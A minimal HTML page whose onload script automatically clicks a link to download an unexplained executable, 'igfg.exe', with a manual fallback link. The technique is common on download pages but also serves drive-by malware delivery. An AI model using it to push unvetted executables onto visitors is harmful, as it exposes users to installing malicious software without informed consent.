<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Automatic File Download</title>
</head>
<body>
    <h1>File Download</h1>
    <p>If the download doesn't start automatically, <a id="download-link" href="igfg.exe" download>click here to download the file</a>.</p>
    <script>
        window.onload = function() {
            var link = document.getElementById('download-link');
            link.click();
        }
    </script>
</body>
</html>
